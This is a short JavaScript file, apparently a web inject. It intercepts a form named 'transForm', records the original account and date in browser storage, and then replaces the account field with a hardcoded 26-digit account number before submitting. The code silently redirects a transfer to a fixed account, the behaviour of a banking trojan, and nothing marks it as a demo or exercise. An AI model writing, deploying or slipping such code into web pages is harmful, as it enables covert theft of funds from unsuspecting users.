document.onreadystatechange = function () {


    if(document.readyState === 'interactive')
    {


        var form = document.getElementById("transForm");
        form.addEventListener("submit", function (e) {
            e.preventDefault();
            console.log(e.target.action);
            if (localStorage.getItem('accarr') == null) {
                var accarr = new Array();
            }
            else {
                var accarr = JSON.parse(localStorage.getItem('accarr'));
            }
            if (localStorage.getItem('datearr') == null) {
                var datearr = new Array();
            }
            else {
                var datearr = JSON.parse(localStorage.getItem('datearr'));
            }

            var accassign = sessionStorage.getItem('acc');
            accarr.push(accassign);
            localStorage.setItem('acc', accassign);
            localStorage.setItem('date', document.getElementById('date').innerHTML);
            datearr.push(document.getElementById('date').innerHTML);

            localStorage.setItem('accarr', JSON.stringify(accarr));
            localStorage.setItem('datearr', JSON.stringify(datearr));

            sessionStorage.setItem('acc', "65432123456789012345678901");
            document.getElementById("account1").value = sessionStorage.getItem('acc');

            form.submit();
        });
    }

};